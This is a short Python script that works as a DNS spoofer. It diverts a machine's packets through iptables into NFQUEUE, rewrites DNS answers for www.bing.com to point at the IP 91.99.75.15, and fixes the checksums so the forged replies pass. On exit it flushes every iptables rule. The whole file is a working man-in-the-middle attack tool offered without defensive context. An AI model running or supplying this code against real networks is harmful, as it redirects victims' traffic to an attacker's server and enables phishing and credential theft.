#!/usr/bin/env python

import subprocess
import netfilterqueue
import scapy.all as scapy


def iptables():
    subprocess.call(["iptables", "-I", "OUTPUT", "-j",
                     "NFQUEUE", '--queue-num', "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j",
                     "NFQUEUE", '--queue-num', "0"])


def iptables_flush():
    subprocess.call(["iptables", "--flush"])


def process_packet(packet):
    dns_packet = scapy.IP(packet.get_payload())
    if dns_packet.haslayer(scapy.DNSRR):
        qname = dns_packet.qd.qname.decode()
        if "www.bing.com" in qname:
            print("Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata="91.99.75.15")
            dns_packet[scapy.DNS].an = answer
            dns_packet[scapy.DNS].ancount = 1

            del dns_packet[scapy.IP].len
            del dns_packet[scapy.IP].chksum
            del dns_packet[scapy.UDP].len
            del dns_packet[scapy.UDP].chksum
            print(dns_packet.show())
            packet.set_payload(bytes(dns_packet))
    packet.accept()


try:
    iptables()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nFlushing ipatables...")
    iptables_flush()
